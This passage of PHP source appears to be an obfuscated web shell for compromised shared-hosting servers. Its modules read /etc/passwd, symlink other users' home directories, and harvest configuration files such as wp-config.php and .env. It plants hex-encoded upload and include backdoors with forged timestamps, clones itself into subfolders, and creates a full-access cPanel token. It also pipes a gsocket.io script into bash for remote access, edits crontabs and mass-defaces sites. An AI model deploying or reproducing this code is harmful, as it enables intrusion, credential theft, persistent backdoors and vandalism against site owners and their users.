if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-rocket'></i> JU".'MP'.'ING</h5></center>';
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Failed to fetch Di"."rect"."ory !"));
	}
	$pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr);
	$fjpr = $fjpr[1];
	if (empty($fjpr)) {
		die(red("[!] No Us"."ers fo"."und !"));
	}
	echo "Total ".$ctn($aru($fjpr))." di"."rec"."to"."ries on Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	foreach ($aru($fjpr) as $fj) {
		$fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
			$en = $en[1];
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME'].mkUrl(array('loknya' => $fjh))."'>".$fjh."</a> => ";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a> => ";
			}
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = $asd['name'];
				if ($asd == $fj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
			echo "<br>";
		} else {
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME'].mkUrl(array('loknya' => $fjh))."'>".$fjh."</a><br>";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a><br>";
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-link'></i> SY".'ML'.'INK</h5></center>';
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Failed to fetch Di"."rec"."to"."ry !"));
	}
	if (!$fnct("sy"."mli"."nk")) {
		if (!$fnct("pr"."oc_"."op"."en")) {
			die(red("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"));
		}
	}
	$cur2 = isset($_GET['opsidua']) ? $_GET['opsidua'] : 'vhost';
	echo "<center>[ " . ($cur2 === 'vhost' ? "<gold>SY"."MLI"."NK VH"."OST</gold>" : "<a href='".mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem'))."'>SY"."MLI"."NK VH"."OST</a>") . " ] - [ " . ($cur2 === "s"."yfile" ? "<gold>SY"."MLI"."NK FI"."LE</gold>" : "<a href='".mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem', 'opsidua' => 'syfile'))."'>SY"."MLI"."NK FI"."LE</a>") . " ] - [ " . ($cur2 === "gra"."bco"."nfig" ? "<gold>GR"."AB CO"."NFIG</gold>" : "<a href='".mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem', 'opsidua' => 'grabconfig'))."'>GR"."AB CO"."NFIG</a>") . " ]</center><br>";
	$symDir = __DIR__ . '/an'.'on_'.'sy'.'m';
	$tmpWeb = isset($_SERVER['SC'.'RI'.'PT_NA'.'ME']) ? $_SERVER['SC'.'RI'.'PT_NA'.'ME'] : '';
	$symWeb = rtrim(dirname($tmpWeb), '/\\') . '/an'.'on_'.'sy'.'m';
	if (!file_exists($symDir)) {
		if (!@mkdir($symDir, 0755, true)) {
			die(red("[!] Cannot create dir : ".$hsc($symDir)." — not writable !"));
		}
	}
	if (!is_writable($symDir)) {
		die(red("[!] Symlink dir not writable : ".$hsc($symDir)));
	}
	$htf = $symDir . '/.ht'.'ac'.'cess';
	if (!file_exists($htf)) {
		@file_put_contents($htf, "Options +Indexes +FollowSymLinks\nDirectoryIndex disabled\n");
	}
	echo "<center><p style='color:#808080;font-size:.8rem'>Symlink dir : <gold>".$hsc($symDir)."</gold> &nbsp; Web base : <gold>".$hsc($symWeb)."</gold></p></center>";
	if ($cur2 === "s"."yfile") {
		echo "<center>Symlink a single file, then open the generated link (served as plain text).<br><br>";
		echo '<form method="post">File : 
			<input type="text" name="domena" style="cursor: text; border-color: #000" class="up" size="55" placeholder="/ho'.'me/'.'use'.'r/p'.'ubli'.'c_ht'.'ml/da'.'tab'.'ase.'.'php" value="'.(isset($_POST['domena']) ? $hsc($_POST['domena']) : '').'">
			<input type="submit" name="gaskeun" value="Create Link" class="up" style="cursor: pointer">
			</form></center>';
		if (isset($_POST['gaskeun'])) {
			$lokdi = isset($_POST['domena']) ? trim($_POST['domena']) : '';
			if ($lokdi === '' || !is_file($lokdi)) {
				red("File not found : ".$hsc($lokdi));
			} elseif (!is_readable($lokdi)) {
				red("File not readable : ".$hsc($lokdi));
			} else {
				$rend = substr(md5(uniqid(mt_rand(), true)), 0, 10) . ".txt";
				if (esyeem($lokdi, $symDir . '/' . $rend)) {
					$lnk = $symWeb . '/' . $rend;
					green("Link created !");
					echo '<center>Open : <a href="'.$hsc($lnk).'" target="_blank"><gold>'.$hsc($lnk)."</gold></a></center><br>";
				} else {
					red("Failed to create symlink — function blocked ?");
				}
			}
		}
		echo "<hr>";
		die(author());
	}
	if ($cur2 === "syread" && isset($_GET['f']) && $_GET['f'] !== '') {
		$lokdi = $_GET['f'];
		echo "<center>Target : <gold>".$hsc($lokdi)."</gold><br><br></center>";
		if (!is_file($lokdi)) {
			red("File not found : ".$hsc($lokdi));
		} elseif (!is_readable($lokdi)) {
			red("File not readable : ".$hsc($lokdi));
		} else {
			$rend = 'cfg_' . substr(md5($lokdi . mt_rand()), 0, 10) . ".txt";
			if (esyeem($lokdi, $symDir . '/' . $rend)) {
				$lnk = $symWeb . '/' . $rend;
				green("Link created !");
				echo '<center>Open : <a href="'.$hsc($lnk).'" target="_blank"><gold>'.$hsc($lnk)."</gold></a></center><br>";
			} else {
				red("Failed to create symlink — function blocked ?");
			}
		}
		echo "<hr>";
		die(author());
	}
	$pma("/\/ho"."me\/(.*?):/i", $syp, $sypr);
	$sypr = $sypr[1];
	if (empty($sypr)) {
		die(red("[!] No Us"."ers fo"."und !"));
	}
	if ($cur2 === "gra"."bco"."nfig") {
		$cands = array(
			'public_html/wp-config.php' => 'WordPress',
			'public_html/.env' => 'Laravel',
			'public_html/configuration.php' => 'Joomla',
			'public_html/config.php' => 'Generic',
			'public_html/sites/default/settings.php' => 'Drupal',
			'public_html/app/etc/local.xml' => 'Magento1',
			'public_html/inc/config.php' => 'Generic',
			'public_html/includes/config.php' => 'vBulletin',
			'public_html/admin/config.php' => 'OpenCart',
			'public_html/application/config/database.php' => 'CodeIgniter',
			'public_html/database.php' => 'Generic',
			'public_html/db.php' => 'Generic',
			'public_html/conn.php' => 'Generic',
			'public_html/koneksi.php' => 'Generic',
		);
		$users = $aru($sypr);
		echo "Checking <gold>".count($users)."</gold> users for known config files...<br><br>";
		echo '<div class="table-responsive"><table class="table table-hover table-bordered"><thead><tr><th>User</th><th>Config File</th><th class="text-center">Readable</th><th class="text-center">Read</th></tr></thead><tbody>';
		$cfgFound = 0;
		foreach ($users as $sj) {
			foreach ($cands as $rel => $label) {
				$cf = '/home/' . $sj . '/' . $rel;
				if (!file_exists($cf)) continue;
				$cfgFound++;
				$ok = is_readable($cf);
				echo "<tr><td>".$hsc($sj)."</td><td style='word-break:break-all'>".$hsc($cf)." <span class='badge badge-custom'>".$label."</span></td>";
				echo "<td class='text-center'>".($ok ? "<span class='badge bg-success'>Yes</span>" : "<span class='badge bg-danger'>No</span>")."</td>";
				echo "<td class='text-center'>".($ok ? "<a href='".mkUrl(array('loknya' => $lokasi, 'opsi' => 'esyeem', 'opsidua' => 'syread', 'f' => $cf))."' class='btn btn-sm btn-action' title='Symlink & Read'><i class='fas fa-eye'></i></a>" : "-")."</td></tr>";
			}
		}
		echo '</tbody></table></div>';
		if ($cfgFound === 0) {
			echo oren("No known config files found.");
		} else {
			echo "<p>Found <gold>".$cfgFound."</gold> config file(s). Click the eye icon to generate a readable link.</p>";
		}
		echo "<hr>";
		die(author());
	}
	echo "Total : <gold>".$ctn($aru($sypr))."</gold> users on <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	$rootOk = esyeem("/", $symDir . "/anon");
	if ($rootOk) {
		green("Root symlink OK — using shared <strong>anon</strong> link.");
	} else {
		echo oren("Root symlink blocked — falling back to per-user links.");
	}
	$hasNamed = $ird("/e"."tc"."/na"."me"."d.co"."nf");
	if ($hasNamed) {
		$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
		$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
		$en = $en[1];
	}
	$okN = 0; $badN = 0;
	foreach ($aru($sypr) as $sj) {
		$sjh = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
		$us = preg_replace('/[^a-zA-Z0-9_.\-]/', '_', $sj);
		if ($rootOk) {
			$lnk = $symWeb . "/anon" . $sjh;
			$okN++;
		} else {
			$ul = $symDir . '/u_' . $us;
			if (esyeem($sjh, $ul)) {
				$lnk = $symWeb . '/u_' . $us;
				$okN++;
			} else {
				$lnk = '';
				$badN++;
			}
		}
		if ($lnk !== '') {
			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$hsc($lnk)."' target=_blank>".$hsc($sjh)."</a>";
		} else {
			echo "[<font color=red>Bl"."oc"."ked</font>] ".$hsc($sjh);
		}
		if ($hasNamed) {
			echo " => ";
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = (is_array($asd) && isset($asd['name'])) ? $asd['name'] : '';
				if ($asd !== '' && $asd == $sj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
		}
		echo "<br>";
	}
	echo "<br>Links OK : <ijo>".$okN."</ijo> &nbsp; Blocked : <merah>".$badN."</merah><br>";
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-save'></i> BA".'CKUP SH'.'ELL</h5></center>';
	if (isset($_POST['lo'.'kr'.'una'])) {
		echo "<center>";
		echo "Path : <gold>".$hsc($_POST['lo'.'kr'.'una'])."</gold><br>";
		if (!$isr($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Unre"."adable !"));
		} elseif (!$isw($_POST['lo'.'kr'.'una'])) {
			die(red("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"));
		}
		$bmode = isset($_POST['bekup_mode']) ? $_POST['bekup_mode'] : 'drop';
		$bcount = isset($_POST['bekup_count']) ? max(1, min(200, (int)$_POST['bekup_count'])) : 5;
		$bloc = $_POST['lo'.'kr'.'una'];
		if ($bmode === 'clone') {
			$self = __FILE__;
			$srcName = $bsn($self);
			$srcData = @$fgt($self);
			if ($srcData === false || strlen($srcData) === 0) {
				die(red("[+] Failed to read current shell file !"));
			}
			$subs = array();
			foreach (@$scd($bloc) as $en) {
				if ($en === '.' || $en === '..') continue;
				if ($idr($bloc . '/' . $en)) { $subs[] = $en; }
			}
			sort($subs);
			if (empty($subs)) {
				die(red("[+] No subfolders in path : ".$hsc($bloc)));
			}
			$ok = 0;
			foreach (array_slice($subs, 0, $bcount) as $sf) {
				$dd = $bloc . '/' . $sf . '/' . $srcName . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 10);
				$mt = @$ftm($bloc . '/' . $sf);
				if (!@$mkd($dd, 0755, true)) {
					echo "[<merah>Fa"."il"."ed</merah>] ".$hsc($dd)."<br>";
					continue;
				}
				$dest = $dd . '/' . $srcName;
				if (@$fpt($dest, $srcData) !== false) {
					@$chm($dest, 0755);
					@$tch($dest, $mt); @$tch($dd, $mt);
					echo "[<ijo>Su"."cc"."ess</ijo>] ".$hsc($dest)."<br>";
					$ok++;
				} else {
					echo "[<merah>Fa"."il"."ed</merah>] ".$hsc($dest)."<br>";
				}
			}
			echo "<br>Total cloned : <gold>".$ok."</gold><br>";
			echo "</center>";
			die();
		} elseif ($bmode === 'spread') {
			if (empty($_FILES['spreadfile']['name']) || $_FILES['spreadfile']['error'] !== UPLOAD_ERR_OK) {
				die(red("[+] No file selected for spread upload !"));
			}
			$on = $bsn($_FILES['spreadfile']['name']);
			$dp = strrpos($on, '.');
			$bname = ($dp !== false) ? substr($on, 0, $dp) . '.backup' . substr($on, $dp) : $on . '.backup';
			$fdata = @$fgt($_FILES['spreadfile']['tm'.'p_na'.'me']);
			if ($fdata === false) {
				die(red("[+] Failed to read temporary file !"));
			}
			$subs = array();
			foreach (@$scd($bloc) as $en) {
				if ($en === '.' || $en === '..') continue;
				if ($idr($bloc . '/' . $en)) { $subs[] = $en; }
			}
			sort($subs);
			if (empty($subs)) {
				die(red("[+] No subfolders in path : ".$hsc($bloc)));
			}
			$ok = 0;
			foreach (array_slice($subs, 0, $bcount) as $sf) {
				$dest = $bloc . '/' . $sf . '/' . $bname;
				$mt = @$ftm($bloc . '/' . $sf);
				if (@$fpt($dest, $fdata) !== false) {
					@$tch($dest, $mt);
					echo "[<ijo>Su"."cc"."ess</ijo>] ".$hsc($dest)."<br>";
					$ok++;
				} else {
					echo "[<merah>Fa"."il"."ed</merah>] ".$hsc($dest)."<br>";
				}
			}
			echo "<br>Total spread : <gold>".$ok."</gold><br>";
			echo "</center>";
			die();
		}
		$loks = sds($_POST['lo'.'kr'.'una']);
		$pisah = $ars($loks, -50);
		$los = $arr($pisah, 2);
		$satu = $loks[$los[0]];
		$satut = $ftm($satu);
		$dua = $loks[$los[1]];
		$duat = $ftm($dua);
		if (empty($satu) && empty($dua)) {
			die(red("[+] Unknown Error !"));
		}
		echo "<br>";
		if (!$isw($satu)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$satu."<br>";
		} else {
			$satus = $satu."/cont"."act.p"."hp";
			$fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c2021223b7d7d3f3e"));
			$tch($satus, $satut);
			$tch($satu, $satut);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$satus."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
				$satul = "<br><a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		if (!$isw($dua)) {
			echo "[<merah>Fa"."il"."ed</merah>] ".$dua."<br>";
		} else {
			$duas = $dua."/setti"."ng.p"."hp";
			$fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303665363136643635336432323632373437353663323233653363363237353734373436663665336534373631373336623631366533633266363237353734373436663665336533633266363636663732366433653061336333663730363837303061323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323232653232373432323265323236353232326532323665323232653232373432323265323237333232336230613234363232303364323032323636323232653232363932323265323236633232326532323635323232653232356632323265323236373232326532323635323232653232373432323265323235663232326532323633323232653232366632323265323236653232326532323734323232653232363532323265323236653232326532323734323232653232373332323362306132343633323033643230323237343232326532323664323232653232373032323265323235663232326532323665323232653232363132323265323236643232326532323635323233623061363936363230323836393733373336353734323832343566343634393463343535333562323736323734373536633237356432393239323037623234363132383234356634363439346334353533356232373632373437353663323735643562323736653631366436353237356432633230323436323238323435663436343934633435353335623237363237343735366332373564356232343633356432393239336236393636323032383636363936633635356636353738363937333734373332383232326532663232326532343566343634393463343535333562323736323734373536633237356435623237366536313664363532373564323932393230376236353633363836663230323234663662363532303231323233623764323036353663373336353230376236353633363836663230323234363631363936633230323132323362376437643061336633652229293b0d0a096966202824632822776b222e22776b2e222e227068222e2270222929207b0d0a09096563686f20224f4b2021223b0d0a097d0d0a7d0d0a3f3e"));
			$tch($duas, $duat);
			$tch($dua, $duat);
			echo "[<ijo>Su"."cc"."ess</ijo>] ".$duas."<br>";
			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
				$dual = "<a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
			}
		}
		echo "<br>";
		if (!empty($satul)) {
			echo $satul;
		}
		if (!empty($dual)) {
			echo $dual;
		}
		echo "</center>";
	} else {
		echo "<center>Enter Docu"."ment Ro"."ot location<br>";
		echo '<form method="post" enctype="multipart/form-data"><input type="text" name="lokruna" value="'.$hsc($_GET['loknya']).'" style="cursor: pointer; border-color: #000" class="up"> ';
		echo '<select name="bekup_mode" class="up" style="cursor: pointer; border-color: #000"><option value="drop">Payload Drop</option><option value="clone">Self Clone</option><option value="spread">Spread Upload</option></select><br><br>';
		echo 'Count (clone/spread) : <input type="text" name="bekup_count" value="5" size="4" class="up" style="border-color: #000"> ';
		echo 'File (spread only) : <input type="file" name="spreadfile" class="up" style="border-color: #000"><br><br>';
		echo '<input type="submit" name="palepale" value="Submit" class="up" style="cursor: pointer"></form>';
		echo "<p style='color:#808080;font-size:.8rem'>Payload Drop = plant contact.php + setting.php into 2 random dirs (original) &nbsp;|&nbsp; Self Clone = replicate this shell file into N subfolders &nbsp;|&nbsp; Spread Upload = spread 1 file into N subfolders as *.backup.*</p>";
	}
	die();
} elseif (isset($_GET['opsi']) && $_GET['opsi'] == "repip") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-exchange-alt'></i> RE".'VER'.'SE IP</h5></center>';
	echo "Re"."ver"."se I"."P : <gold>".$hsc($_SERVER['SE'.'RVE'.'R_NA'.'ME'])."</gold>";
	echo "<pre>".$hsc(crul("http"."s://ap"."i.ha"."ck"."ertarg"."et.com/re"."verse"."ipl"."ookup/?q=".$_SERVER['SE'.'RVE'.'R_NA'.'ME']))."</pre>";
	echo "</center>";
	die();
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "cpanel") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-server'></i> CP".'AN'.'EL UA'.'PI</h5></center>';
	$randName = "Maw".rand(100,999);
	$cmd = "ua"."pi Tok"."ens crea"."te_fu"."ll_ac"."cess n"."ame='".$randName."'";
	echo "<pre>".$hsc(komenb($cmd, $lokasi))."</pre>";
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "gsocket") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-plug'></i> GS".'OC'.'KET</h5></center>';
	$cmd = "cu"."rl -f"."sSL h"."tt"."ps://gs"."ock"."et."."io/x | b"."ash";
	echo "<pre>".$hsc(komenb($cmd, $lokasi))."</pre>";
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "adminer") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-database'></i> AD".'MI'.'NER</h5></center>';
	$url = "ht"."tps://gi"."thu"."b.co"."m/vr"."ana/ad"."min"."er/rele"."ases/dow"."nloa"."d/v4."."8.1/ad"."min"."er-4.8.1.p"."hp";
	$data = @$fgt($url);
	if ($data !== false) {
		$result = @$fpt($lokasi."/ad"."min"."er.p"."hp", $data);
		if ($result !== false && $fxt($lokasi."/ad"."min"."er.p"."hp")) {
			green("Ad"."min"."er downloaded suc"."cessfully: ".$lokasi."/ad"."min"."er.p"."hp");
			if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $lokasi."/ad"."min"."er.p"."hp");
				echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
			}
		} else {
			red("Fa"."iled to sa"."ve ad"."min"."er.p"."hp!");
		}
	} else {
		red("Fa"."iled to dow"."nlo"."ad ad"."min"."er!");
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "cron") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-clock'></i> CRO".'N JOB MA'.'NA'.'GER</h5></center>';
	$tmpf = $lokasi."/.cr"."on"."tmp";
	if (isset($_POST['savecron'])) {
		@$fpt($tmpf, $_POST['crontext']);
		$res = komenb("cr"."ont"."ab ".$tmpf, $lokasi);
		@$ulk($tmpf);
		if (empty($res)) {
			green("Cr"."on s"."av"."ed suc"."ces"."sfu"."lly!");
		} else {
			red("Er"."ror: ".$hsc($res));
		}
	}
	$crondata = komenb("cr"."ont"."ab -l", $lokasi);
	if (empty($crondata) || $sps($crondata, "no crontab") !== false) {
		$crondata = "# No crontab found - add your entries here\n# Example: * * * * * /path/to/command";
	}
	echo '<form method="post">';
	echo '<textarea name="crontext" cols="85" rows="16" style="background:#0a0a0a61;color:#e5e5e5;border:1px solid #1f1f1f;font-family:JetBrains Mono,monospace;font-size:0.85rem;padding:12px;border-radius:6px;width:100%">'.$hsc($crondata).'</textarea><br><br>';
	echo '<button type="submit" name="savecron" class="btn btn-primary-custom"><i class="fas fa-save"></i> Sa'.'ve Cr'.'on</button>';
	echo '</form>';
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "config") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-search'></i> CON".'FIG GRA'.'BBER</h5></center>';
	$docRoot = $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'];
	echo "<p style='color:#808080'>Scann"."ing fro"."m: <span style='color:#d4af37'>".$hsc($docRoot)."</span></p>";
	$cfgPatterns = array(
		"wp-co"."nfi"."g.p"."hp",
		".e"."nv",
		"con"."fig.p"."hp",
		"dat"."abase."."ph"."p",
		"se"."tti"."ngs.p"."hp",
		"con"."figu"."rat"."ion.p"."hp",
		"lo"."cal-c"."onf"."ig.ph"."p",
		".en"."v.lo"."cal",
		"db.ph"."p",
		"dbco"."nfi"."g.p"."hp",
		"my"."sql.p"."hp",
		"co"."nn"."ect.p"."hp",
		"kon"."ek"."si.p"."hp",
		"cre"."den"."tials.ph"."p",
		"se"."cret.p"."hp",
		"ap"."p/co"."nfig/da"."tab"."ase.p"."hp",
		"inc"."lud"."es/co"."nf"."ig.ph"."p",
		"i"."nc/co"."nf"."ig.ph"."p",
	);
	$found = cfgSc($docRoot, $cfgPatterns);
	if (empty($found)) {
		echo oren("No co"."nfig files fo"."und in cur"."rent di"."rec"."to"."ry!");
	} else {
		$ctn = "co"."unt";
		echo "<p>Found <strong style='color:#d4af37'>".$ctn($found)."</strong> config ".($ctn($found) > 1 ? "files" : "file")."</p>";
		foreach ($found as $f) {
			echo "<div style='background:#0a0a0a61;border:1px solid #1f1f1f;border-radius:6px;padding:12px;margin-bottom:12px;text-align:left'>";
			echo "<strong style='color:#d4af37'><i class='fas fa-file-code'></i> ".$hsc($f)."</strong>";
			echo "<pre style='margin-top:8px;max-height:400px;overflow-y:auto'>".$hsc(@$fgt($f))."</pre>";
			echo "</div>";
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "mdf") {
	echo "<center>";
	echo "<center><h5 style='color:#fff'><i class='fas fa-fire'></i> MA".'SS DE'.'FA'.'CE</h5></center>';
	if (empty($_POST['palepale'])) {
		echo '<form method="post">';
		echo 'Di'.'r : <input type="text" name="lokena" class="up" style="cursor: pointer; border-color: #000" value="'.$hsc($_GET['loknya']).'"><br>';
		echo 'File Na'.'me : <input type="text" name="nfil" class="up" style="cursor: pointer; border-color: #000" value="ind'.'ex.p'.'hp"><br><br>';
		echo 'File Cont'.'ent : <br><textarea class="up" cols="80" rows="20" name="isikod"></textarea><br><br>';
		echo '<select name="opsina"><option value="mdf">Ma'.'ss Def'.'ace</option><option value="mds">Ma'.'ss De'.'fa'.'ce 2</option></select><br><br>';
		echo '<input type="submit" name="palepale" value="Submit" class="up" style="cursor: pointer">';
		echo '</form>';
	} else {
		$lokena = $_POST['lokena'];
		$nfil = $_POST['nfil'];
		$isif = $_POST['isikod'];
		echo "Di"."r : <gold>".$hsc($lokena)."</gold><br>";
		if (!$fxt($lokena)) {
			die(red("[+] Di"."re"."cto"."ry not fo"."und !"));
		}
		$g = $scd($lokena);
		if (isset($_POST['opsina']) && $_POST['opsina'] == "mds") {
			foreach ($g as $gg) {
				if (isset($gg) && ($gg == "." || $gg == "..")) {
					continue;
				} elseif (!$idr($lokena."/".$gg)) {
					continue;
				}
				if (!$isw($lokena."/".$gg)) {
					echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
					continue;
				}
				$loe = $lokena."/".$gg."/".$nfil;
				if ($fpt($loe, $isif) !== false) {
					echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
				} else {
					echo "[<merah>Fa"."il"."ed</merah>] ".$loe."<br>";
				}
			}
			echo "<hr>";
			die(author());
		}
		foreach ($g as $gg) {
			if (isset($gg) && ($gg == "." || $gg == "..")) {
				continue;
			} elseif (!$idr($lokena."/".$gg)) {
				continue;
			}
			if (!$isw($lokena."/".$gg)) {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
				continue;
			}
			$loe = $lokena."/".$gg."/".$nfil;
			if ($fpt($loe, $isif) !== false) {
				echo "[<ijo>Su"."cc"."ess</ijo>] ".$loe."<br>";
			} else {
				echo "[<merah>Un"."wri"."tea"."ble</merah>] ".$lokena."/".$gg."<br>";
			}
		}
	}
	echo "<hr>";
	echo "</center>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "recent") {
	function maw_rsm($dr, $dep, &$lst, &$capx) {
		$scx = "sc"."an"."di"."r";
		$fix = "is"."_fi"."le";
		$dix = "is"."_di"."r";
		$rax = "is"."_re"."ada"."ble";
		$ftx = "fi"."lem"."ti"."me";
		if ($dep > 6 || $capx > 2500) return;
		$its = @$scx($dr);
		if (!is_array($its)) return;
		foreach ($its as $it) {
			if ($it === '.' || $it === '..') continue;
			$p = rtrim($dr, '/') . '/' . $it;
			if ($fix($p)) {
				$capx++;
				$t = @$ftx($p);
				if ($t !== false) {
					$lst[] = array($p, $t);
				}
			} elseif ($dix($p)) {
				if ($rax($p)) {
					maw_rsm($p, $dep + 1, $lst, $capx);
				}
			}
		}
	}
	$tjual = array();
